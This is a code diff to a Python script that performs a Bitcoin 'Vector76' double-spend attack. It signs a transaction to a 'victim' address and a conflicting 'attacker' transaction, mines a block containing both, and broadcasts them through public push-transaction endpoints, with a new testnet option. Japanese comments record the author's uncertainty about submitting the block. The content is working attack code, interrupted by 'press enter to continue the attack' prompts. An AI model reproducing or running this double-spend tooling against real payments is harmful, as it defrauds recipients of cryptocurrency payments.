@@ -48,10 +48,14 @@ def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return int(btc_amount / satoshi)
 
-def broadcast_transaction(raw_tx):
+def broadcast_transaction(raw_tx, testnet):
     url = "https://blockchain.info/pushtx"
-    payload = {'tx': raw_tx}
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    payload = {'tx': raw_tx}
+    if testnet:
+        url = "https://blockstream.info/testnet/api/tx"
+        headers = {'Content-Type': 'text/plain'}
+        payload = raw_tx
 
     response = requests.post(url, data=payload, headers=headers)
     print(response)
@@ -201,7 +205,7 @@ print()
 #key   = transaction_util.encode_privkey(key, "wif")
 inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
 print(inputs)
-tx_victim = [{"txid": prev_txid, "address": victim_address, "value": to_satoshi(amount_btc)}]
+tx_victim = [{"address": victim_address, "value": to_satoshi(amount_btc)}]
 tx_victim = transaction_util.mktx(inputs, tx_victim)
 tx_victim = serialize(transaction_util.signall(tx_victim, key))
 print(tx_victim)
@@ -215,12 +219,18 @@ tx_attacker = serialize(transaction_util.signall(tx_attacker, key))
 #print(tx_V2)
 #tx_victim   = rpc_node.createrawtransactionwithkey(f"{tx_V1} \"[\"{key}\"]\"")
 #tx_attacker = rpc_node.createrawtransactionwithkey(f"{tx_V2} \"[\"{key}\"]\"")
+print()
+print("Mining Vector76 Block...")
+print()
+vector76_tx = f"{tx_victim}{tx_attacker}"
+vector76_block = rpc_node.generateblock(f'{attacker_address} "[\'{vector76_tx}\']" false') # この段階ではブロックを公開しない??
 print("--------------------")
 print(f"Victim      : {victim_address}")
 print(f"Attacker    : {attacker_address}")
 print(f"Send Amount (BTC unit)    : {amount_btc} BTC")
-print(f"Signed V1 RawTx               : {tx_victim}")
-print(f"Signed V2 RawTx               : {tx_attacker}")
+print(f"Signed V1 RawTx           : {tx_victim}")
+print(f"Signed V2 RawTx           : {tx_attacker}")
+print(f"Vector76 Block            : {vector76_block}")
 print("--------------------")
 
 print("[+] READY...")
@@ -230,16 +240,12 @@ input(" --- Press the enter key to continue the Vector76 attack... --- ")
 print()
 
 print("push V1 TX...")
-rpc_node.sendrawtransaction(tx_victim)#transaction_util.pushtx(tx_victim) 
+broadcast_transaction(tx_victim, testnet)#transaction_util.pushtx(tx_victim) 
 print("push V2 TX...")
-rpc_node.sendrawtransaction(tx_attacker)#transaction_util.pushtx(tx_attacker) 
+broadcast_transaction(tx_attacker, testnet)#transaction_util.pushtx(tx_attacker) 
 print()
 input("--- Send the block after pressing the enter key. --- ")
-print()
-print("Mining Vector76 Block...")
-print()
-vector76_tx = f"{tx_victim}{tx_attacker}"
-vector76_block = rpc_node.generateblock(f'{attacker_address} "[\'{vector76_tx}\']"')
+broadcast_transaction(vector76_block, testnet) #結局ブロックそのものはトランザクションの塊だからこういうことでいいのかな
 #miner = Wallet()
 #print(miner)
 #print(f"Submit Vector76 Block...   : {vector76_block}")
